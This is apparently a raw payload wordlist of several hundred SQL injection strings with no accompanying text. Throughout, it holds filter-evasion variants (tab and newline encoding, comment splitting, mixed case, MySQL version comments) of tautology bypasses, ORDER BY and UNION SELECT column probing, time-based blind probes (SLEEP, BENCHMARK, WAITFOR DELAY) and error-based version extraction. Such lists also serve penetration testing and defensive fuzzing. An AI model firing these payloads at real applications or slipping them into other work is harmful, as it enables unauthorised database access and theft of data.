  '"%09OR%09SL/**/EEP(15)--'
  '"%09OR%09SL/**/EEP(2)--'
  '"%09OR%09SL/**/EEP(3)--'
  '"%09OR%09SL/**/EEP(5)--'
  '"%09OR%09SLEEP(0)--'
  '"%09OR%09SLEEP(1)--'
  '"%09OR%09SLEEP(10)--'
  '"%09OR%09SLEEP(15)--'
  '"%09OR%09SLEEP(2)--'
  '"%09OR%09SLEEP(3)--'
  '"%09OR%09SLEEP(5)--'
  '"%09OR%0a1=1--'
  '"%09OR%0d1=1--'
  '"%09OR/**/DER%09BY%091--'
  '"%09OR/**/DER%09BY%0910--'
  '"%09OR/**/DER%09BY%0911--'
  '"%09OR/**/DER%09BY%0912--'
  '"%09OR/**/DER%09BY%0913--'
  '"%09OR/**/DER%09BY%0914--'
  '"%09OR/**/DER%09BY%0915--'
  '"%09OR/**/DER%09BY%092--'
  '"%09OR/**/DER%09BY%093--'
  '"%09OR/**/DER%09BY%094--'
  '"%09OR/**/DER%09BY%095--'
  '"%09OR/**/DER%09BY%096--'
  '"%09OR/**/DER%09BY%097--'
  '"%09OR/**/DER%09BY%098--'
  '"%09OR/**/DER%09BY%099--'
  '"%09ORDER%09BY%091--'
  '"%09ORDER%09BY%0910--'
  '"%09ORDER%09BY%0911--'
  '"%09ORDER%09BY%0912--'
  '"%09ORDER%09BY%0913--'
  '"%09ORDER%09BY%0914--'
  '"%09ORDER%09BY%0915--'
  '"%09ORDER%09BY%092--'
  '"%09ORDER%09BY%093--'
  '"%09ORDER%09BY%094--'
  '"%09ORDER%09BY%095--'
  '"%09ORDER%09BY%096--'
  '"%09ORDER%09BY%097--'
  '"%09ORDER%09BY%098--'
  '"%09ORDER%09BY%099--'
  '"%09OoRr%091=1--'
  '"%09Or%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%09Or%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''#'
  '"%09Or%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09Or%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'
  '"%09Or%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09Or%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'
  '"%09Or%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09Or%091=1#'
  '"%09Or%091=1--'
  '"%09Or%091=1--%09-'
  '"%09Or%09bEnChMaRk(10000000,Md5(1))--'
  '"%09Or%09sLeEp(0)--'
  '"%09Or%09sLeEp(1)--'
  '"%09Or%09sLeEp(10)--'
  '"%09Or%09sLeEp(15)--'
  '"%09Or%09sLeEp(2)--'
  '"%09Or%09sLeEp(3)--'
  '"%09Or%09sLeEp(5)--'
  '"%09Or%0A1=1--'
  '"%09Or%0D1=1--'
  '"%09OrDeR%09By%091--'
  '"%09OrDeR%09By%0910--'
  '"%09OrDeR%09By%0911--'
  '"%09OrDeR%09By%0912--'
  '"%09OrDeR%09By%0913--'
  '"%09OrDeR%09By%0914--'
  '"%09OrDeR%09By%0915--'
  '"%09OrDeR%09By%092--'
  '"%09OrDeR%09By%093--'
  '"%09OrDeR%09By%094--'
  '"%09OrDeR%09By%095--'
  '"%09OrDeR%09By%096--'
  '"%09OrDeR%09By%097--'
  '"%09OrDeR%09By%098--'
  '"%09OrDeR%09By%099--'
  '"%09UN/**/ION%09ALL%09SELECT%091,2,3,4,5--'
  '"%09UN/**/ION%09ALL%09SELECT%091,2,3,4--'
  '"%09UN/**/ION%09ALL%09SELECT%091,2,3--'
  '"%09UN/**/ION%09ALL%09SELECT%091,2--'
  '"%09UN/**/ION%09ALL%09SELECT%091--'
  '"%09UN/**/ION%09SELECT%091,2,3,4,5--'
  '"%09UN/**/ION%09SELECT%091,2,3,4--'
  '"%09UN/**/ION%09SELECT%091,2,3--'
  '"%09UN/**/ION%09SELECT%091,2--'
  '"%09UN/**/ION%09SELECT%091--'
  '"%09UN/**/ION%09SELECT%09NULL,NULL,NULL,NULL--'
  '"%09UN/**/ION%09SELECT%09NULL,NULL,NULL--'
  '"%09UN/**/ION%09SELECT%09NULL,NULL--'
  '"%09UN/**/ION%09SELECT%09NULL--'
  '"%09UNION%09/*!50000SELECT*/%091,2,3,4,5--'
  '"%09UNION%09/*!50000SELECT*/%091,2,3,4--'
  '"%09UNION%09/*!50000SELECT*/%091,2,3--'
  '"%09UNION%09/*!50000SELECT*/%091,2--'
  '"%09UNION%09/*!50000SELECT*/%091--'
  '"%09UNION%09/*!50000SELECT*/%09NULL,NULL,NULL,NULL--'
  '"%09UNION%09/*!50000SELECT*/%09NULL,NULL,NULL--'
  '"%09UNION%09/*!50000SELECT*/%09NULL,NULL--'
  '"%09UNION%09/*!50000SELECT*/%09NULL--'
  '"%09UNION%09ALL%09/*!50000SELECT*/%091,2,3,4,5--'
  '"%09UNION%09ALL%09/*!50000SELECT*/%091,2,3,4--'
  '"%09UNION%09ALL%09/*!50000SELECT*/%091,2,3--'
  '"%09UNION%09ALL%09/*!50000SELECT*/%091,2--'
  '"%09UNION%09ALL%09/*!50000SELECT*/%091--'
  '"%09UNION%09ALL%09SEL/**/ECT%091,2,3,4,5--'
  '"%09UNION%09ALL%09SEL/**/ECT%091,2,3,4--'
  '"%09UNION%09ALL%09SEL/**/ECT%091,2,3--'
  '"%09UNION%09ALL%09SEL/**/ECT%091,2--'
  '"%09UNION%09ALL%09SEL/**/ECT%091--'
  '"%09UNION%09ALL%09SELECT%091,2,3,4,5--'
  '"%09UNION%09ALL%09SELECT%091,2,3,4--'
  '"%09UNION%09ALL%09SELECT%091,2,3--'
  '"%09UNION%09ALL%09SELECT%091,2--'
  '"%09UNION%09ALL%09SELECT%091--'
  '"%09UNION%09SEL/**/ECT%091,2,3,4,5--'
  '"%09UNION%09SEL/**/ECT%091,2,3,4--'
  '"%09UNION%09SEL/**/ECT%091,2,3--'
  '"%09UNION%09SEL/**/ECT%091,2--'
  '"%09UNION%09SEL/**/ECT%091--'
  '"%09UNION%09SEL/**/ECT%09NULL,NULL,NULL,NULL--'
  '"%09UNION%09SEL/**/ECT%09NULL,NULL,NULL--'
  '"%09UNION%09SEL/**/ECT%09NULL,NULL--'
  '"%09UNION%09SEL/**/ECT%09NULL--'
  '"%09UNION%09SELECT%091,2,3,4,5--'
  '"%09UNION%09SELECT%091,2,3,4--'
  '"%09UNION%09SELECT%091,2,3--'
  '"%09UNION%09SELECT%091,2--'
  '"%09UNION%09SELECT%091--'
  '"%09UNION%09SELECT%09NULL,NULL,NULL,NULL--'
  '"%09UNION%09SELECT%09NULL,NULL,NULL--'
  '"%09UNION%09SELECT%09NULL,NULL--'
  '"%09UNION%09SELECT%09NULL--'
  '"%09UnIoN%09AlL%09SeLeCt%091,2,3,4,5--'
  '"%09UnIoN%09AlL%09SeLeCt%091,2,3,4--'
  '"%09UnIoN%09AlL%09SeLeCt%091,2,3--'
  '"%09UnIoN%09AlL%09SeLeCt%091,2--'
  '"%09UnIoN%09AlL%09SeLeCt%091--'
  '"%09UnIoN%09SeLeCt%091,2,3,4,5--'
  '"%09UnIoN%09SeLeCt%091,2,3,4--'
  '"%09UnIoN%09SeLeCt%091,2,3--'
  '"%09UnIoN%09SeLeCt%091,2--'
  '"%09UnIoN%09SeLeCt%091--'
  '"%09UnIoN%09SeLeCt%09nUlL,NuLl,nUlL,NuLl--'
  '"%09UnIoN%09SeLeCt%09nUlL,NuLl,nUlL--'
  '"%09UnIoN%09SeLeCt%09nUlL,NuLl--'
  '"%09UnIoN%09SeLeCt%09nUlL--'
  '"%09WAITFO/**/R%09DELAY%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09WAITFO/**/R%09DELAY%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:10'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09WAITFO/**/R%09DELAY%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:15'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09WAITFO/**/R%09DELAY%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:2'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09WAITFO/**/R%09DELAY%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:3'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09WAITFO/**/R%09DELAY%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:5'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09WAITFOR%09DELAY%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09WAITFOR%09DELAY%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:10'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09WAITFOR%09DELAY%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:15'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09WAITFOR%09DELAY%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:2'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09WAITFOR%09DELAY%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:3'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09WAITFOR%09DELAY%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:5'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09WaItFoR%09DeLaY%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09WaItFoR%09DeLaY%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:10'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09WaItFoR%09DeLaY%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:15'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09WaItFoR%09DeLaY%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:2'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09WaItFoR%09DeLaY%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:3'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09WaItFoR%09DeLaY%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:5'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09a/**/Nd%091=1#'
  '"%09a/**/Nd%091=1--'
  '"%09a/**/Nd%091=1--%09-'
  '"%09a/**/nd%091=1#'
  '"%09a/**/nd%091=1--'
  '"%09a/**/nd%091=1--%09-'
  '"%09aNd%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%09aNd%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''2'
  '"%09aNd%091=1#'
  '"%09aNd%091=1--'
  '"%09aNd%091=1--%09-'
  '"%09aNd%091=2--'
  '"%09aNd%09bEnChMaRk(10000000,Md5(1))--'
  '"%09aNd%09bEnChMaRk(5000000,mD5(1))--'
  '"%09aNd%09bEnChMaRk(50000000,Md5(1))--'
  '"%09aNd%09eXtRaCtVaLuE(1,CoNcAt(0X7E,(sElEcT%09@@VeRsIoN)))--'
  '"%09aNd%09sLeEp(0)--'
  '"%09aNd%09sLeEp(1)--'
  '"%09aNd%09sLeEp(10)--'
  '"%09aNd%09sLeEp(15)--'
  '"%09aNd%09sLeEp(2)--'
  '"%09aNd%09sLeEp(3)--'
  '"%09aNd%09sLeEp(5)--'
  '"%09and%091=1#'
  '"%09and%091=1--'
  '"%09and%091=1--%09-'
  '"%09o/**/R%091=1#'
  '"%09o/**/R%091=1--'
  '"%09o/**/R%091=1--%09-'
  '"%09o/**/r%091=1#'
  '"%09o/**/r%091=1--'
  '"%09o/**/r%091=1--%09-'
  '"%09oOrR%091=1--'
  '"%09oR%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%09oR%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''#'
  '"%09oR%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09oR%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'
  '"%09oR%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09oR%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'
  '"%09oR%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09oR%091=1#'
  '"%09oR%091=1--'
  '"%09oR%091=1--%09-'
  '"%09oR%09BeNcHmArK(10000000,mD5(1))--'
  '"%09oR%09SlEeP(0)--'
  '"%09oR%09SlEeP(1)--'
  '"%09oR%09SlEeP(10)--'
  '"%09oR%09SlEeP(15)--'
  '"%09oR%09SlEeP(2)--'
  '"%09oR%09SlEeP(3)--'
  '"%09oR%09SlEeP(5)--'
  '"%09oR%0a1=1--'
  '"%09oR%0d1=1--'
  '"%09oRdEr%09bY%091--'
  '"%09oRdEr%09bY%0910--'
  '"%09oRdEr%09bY%0911--'
  '"%09oRdEr%09bY%0912--'
  '"%09oRdEr%09bY%0913--'
  '"%09oRdEr%09bY%0914--'
  '"%09oRdEr%09bY%0915--'
  '"%09oRdEr%09bY%092--'
  '"%09oRdEr%09bY%093--'
  '"%09oRdEr%09bY%094--'
  '"%09oRdEr%09bY%095--'
  '"%09oRdEr%09bY%096--'
  '"%09oRdEr%09bY%097--'
  '"%09oRdEr%09bY%098--'
  '"%09oRdEr%09bY%099--'
  '"%09or%091=1#'
  '"%09or%091=1--'
  '"%09or%091=1--%09-'
  '"%09uNiOn%09aLl%09sElEcT%091,2,3,4,5--'
  '"%09uNiOn%09aLl%09sElEcT%091,2,3,4--'
  '"%09uNiOn%09aLl%09sElEcT%091,2,3--'
  '"%09uNiOn%09aLl%09sElEcT%091,2--'
  '"%09uNiOn%09aLl%09sElEcT%091--'
  '"%09uNiOn%09sElEcT%091,2,3,4,5--'
  '"%09uNiOn%09sElEcT%091,2,3,4--'
  '"%09uNiOn%09sElEcT%091,2,3--'
  '"%09uNiOn%09sElEcT%091,2--'
  '"%09uNiOn%09sElEcT%091--'
  '"%09uNiOn%09sElEcT%09NuLl,nUlL,NuLl,nUlL--'
  '"%09uNiOn%09sElEcT%09NuLl,nUlL,NuLl--'
  '"%09uNiOn%09sElEcT%09NuLl,nUlL--'
  '"%09uNiOn%09sElEcT%09NuLl--'
  '"%09wAiTfOr%09dElAy%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09wAiTfOr%09dElAy%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:10'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09wAiTfOr%09dElAy%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:15'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09wAiTfOr%09dElAy%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:2'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09wAiTfOr%09dElAy%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:3'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09wAiTfOr%09dElAy%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:5'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0A%4f%52%0a1=1--'
  '"%0Aa/**/Nd%0A1=1--'
  '"%0AaNd%0A'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%0AaNd%0A'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''2'
  '"%0AaNd%0A1=1#'
  '"%0AaNd%0A1=1--'
  '"%0AaNd%0A1=1--%0A-'
  '"%0AaNd%0A1=2--'
  '"%0AaNd%0AbEnChMaRk(10000000,Md5(1))--'
  '"%0AaNd%0AbEnChMaRk(5000000,mD5(1))--'
  '"%0AaNd%0AbEnChMaRk(50000000,Md5(1))--'
  '"%0AaNd%0AeXtRaCtVaLuE(1,CoNcAt(0X7E,(sElEcT%0a@@VeRsIoN)))--'
  '"%0AaNd%0AsLeEp(0)--'
  '"%0AaNd%0AsLeEp(1)--'
  '"%0AaNd%0AsLeEp(10)--'
  '"%0AaNd%0AsLeEp(15)--'
  '"%0AaNd%0AsLeEp(2)--'
  '"%0AaNd%0AsLeEp(3)--'
  '"%0AaNd%0AsLeEp(5)--'
  '"%0Ao/**/R%0a1=1--'
  '"%0AoOrR%0a1=1--'
  '"%0AoR%091=1--'
  '"%0AoR%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%0AoR%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''#'
  '"%0AoR%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0AoR%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'
  '"%0AoR%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0AoR%0a1=1#'
  '"%0AoR%0a1=1--'
  '"%0AoR%0a1=1--%0a-'
  '"%0AoR%0aBeNcHmArK(10000000,mD5(1))--'
  '"%0AoR%0aSlEeP(0)--'
  '"%0AoR%0aSlEeP(1)--'
  '"%0AoR%0aSlEeP(10)--'
  '"%0AoR%0aSlEeP(15)--'
  '"%0AoR%0aSlEeP(2)--'
  '"%0AoR%0aSlEeP(3)--'
  '"%0AoR%0aSlEeP(5)--'
  '"%0AoR%0d1=1--'
  '"%0AoRdEr%0AbY%0a1--'
  '"%0AoRdEr%0AbY%0a10--'
  '"%0AoRdEr%0AbY%0a11--'
  '"%0AoRdEr%0AbY%0a12--'
  '"%0AoRdEr%0AbY%0a13--'
  '"%0AoRdEr%0AbY%0a14--'
  '"%0AoRdEr%0AbY%0a15--'
  '"%0AoRdEr%0AbY%0a2--'
  '"%0AoRdEr%0AbY%0a3--'
  '"%0AoRdEr%0AbY%0a4--'
  '"%0AoRdEr%0AbY%0a5--'
  '"%0AoRdEr%0AbY%0a6--'
  '"%0AoRdEr%0AbY%0a7--'
  '"%0AoRdEr%0AbY%0a8--'
  '"%0AoRdEr%0AbY%0a9--'
  '"%0AuNiOn%0AaLl%0AsElEcT%0a1,2,3,4,5--'
  '"%0AuNiOn%0AaLl%0AsElEcT%0a1,2,3,4--'
  '"%0AuNiOn%0AaLl%0AsElEcT%0a1,2,3--'
  '"%0AuNiOn%0AaLl%0AsElEcT%0a1,2--'
  '"%0AuNiOn%0AaLl%0AsElEcT%0a1--'
  '"%0AuNiOn%0AsElEcT%0a1,2,3,4,5--'
  '"%0AuNiOn%0AsElEcT%0a1,2,3,4--'
  '"%0AuNiOn%0AsElEcT%0a1,2,3--'
  '"%0AuNiOn%0AsElEcT%0a1,2--'
  '"%0AuNiOn%0AsElEcT%0a1--'
  '"%0AuNiOn%0AsElEcT%0aNuLl,nUlL,NuLl,nUlL--'
  '"%0AuNiOn%0AsElEcT%0aNuLl,nUlL,NuLl--'
  '"%0AuNiOn%0AsElEcT%0aNuLl,nUlL--'
  '"%0AuNiOn%0AsElEcT%0aNuLl--'
  '"%0AwAiTfOr%0AdElAy%0A'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0AwAiTfOr%0AdElAy%0A'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:10'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0AwAiTfOr%0AdElAy%0A'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:15'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0AwAiTfOr%0AdElAy%0A'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:2'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0AwAiTfOr%0AdElAy%0A'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:3'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0AwAiTfOr%0AdElAy%0A'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:5'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0D%4f%52%0d1=1--'
  '"%0Da/**/Nd%0D1=1--'
  '"%0DaNd%0D'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%0DaNd%0D'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''2'
  '"%0DaNd%0D1=1#'
  '"%0DaNd%0D1=1--'
  '"%0DaNd%0D1=1--%0D-'
  '"%0DaNd%0D1=2--'
  '"%0DaNd%0DbEnChMaRk(10000000,Md5(1))--'
  '"%0DaNd%0DbEnChMaRk(5000000,mD5(1))--'
  '"%0DaNd%0DbEnChMaRk(50000000,Md5(1))--'
  '"%0DaNd%0DeXtRaCtVaLuE(1,CoNcAt(0X7E,(sElEcT%0d@@VeRsIoN)))--'
  '"%0DaNd%0DsLeEp(0)--'
  '"%0DaNd%0DsLeEp(1)--'
  '"%0DaNd%0DsLeEp(10)--'
  '"%0DaNd%0DsLeEp(15)--'
  '"%0DaNd%0DsLeEp(2)--'
  '"%0DaNd%0DsLeEp(3)--'
  '"%0DaNd%0DsLeEp(5)--'
  '"%0Do/**/R%0d1=1--'
  '"%0DoOrR%0d1=1--'
  '"%0DoR%091=1--'
  '"%0DoR%0a1=1--'
  '"%0DoR%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%0DoR%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''#'
  '"%0DoR%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0DoR%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'
  '"%0DoR%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0DoR%0d1=1#'
  '"%0DoR%0d1=1--'
  '"%0DoR%0d1=1--%0d-'
  '"%0DoR%0dBeNcHmArK(10000000,mD5(1))--'
  '"%0DoR%0dSlEeP(0)--'
  '"%0DoR%0dSlEeP(1)--'
  '"%0DoR%0dSlEeP(10)--'
  '"%0DoR%0dSlEeP(15)--'
  '"%0DoR%0dSlEeP(2)--'
  '"%0DoR%0dSlEeP(3)--'
  '"%0DoR%0dSlEeP(5)--'
  '"%0DoRdEr%0DbY%0d1--'
  '"%0DoRdEr%0DbY%0d10--'
  '"%0DoRdEr%0DbY%0d11--'
  '"%0DoRdEr%0DbY%0d12--'
  '"%0DoRdEr%0DbY%0d13--'
  '"%0DoRdEr%0DbY%0d14--'
  '"%0DoRdEr%0DbY%0d15--'
  '"%0DoRdEr%0DbY%0d2--'
  '"%0DoRdEr%0DbY%0d3--'
  '"%0DoRdEr%0DbY%0d4--'
  '"%0DoRdEr%0DbY%0d5--'
  '"%0DoRdEr%0DbY%0d6--'
  '"%0DoRdEr%0DbY%0d7--'
  '"%0DoRdEr%0DbY%0d8--'
  '"%0DoRdEr%0DbY%0d9--'
  '"%0DuNiOn%0DaLl%0DsElEcT%0d1,2,3,4,5--'
  '"%0DuNiOn%0DaLl%0DsElEcT%0d1,2,3,4--'
  '"%0DuNiOn%0DaLl%0DsElEcT%0d1,2,3--'
  '"%0DuNiOn%0DaLl%0DsElEcT%0d1,2--'
  '"%0DuNiOn%0DaLl%0DsElEcT%0d1--'
  '"%0DuNiOn%0DsElEcT%0d1,2,3,4,5--'
  '"%0DuNiOn%0DsElEcT%0d1,2,3,4--'
  '"%0DuNiOn%0DsElEcT%0d1,2,3--'
  '"%0DuNiOn%0DsElEcT%0d1,2--'
  '"%0DuNiOn%0DsElEcT%0d1--'
  '"%0DuNiOn%0DsElEcT%0dNuLl,nUlL,NuLl,nUlL--'
  '"%0DuNiOn%0DsElEcT%0dNuLl,nUlL,NuLl--'
  '"%0DuNiOn%0DsElEcT%0dNuLl,nUlL--'
  '"%0DuNiOn%0DsElEcT%0dNuLl--'
  '"%0DwAiTfOr%0DdElAy%0D'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0DwAiTfOr%0DdElAy%0D'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:10'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0DwAiTfOr%0DdElAy%0D'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:15'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
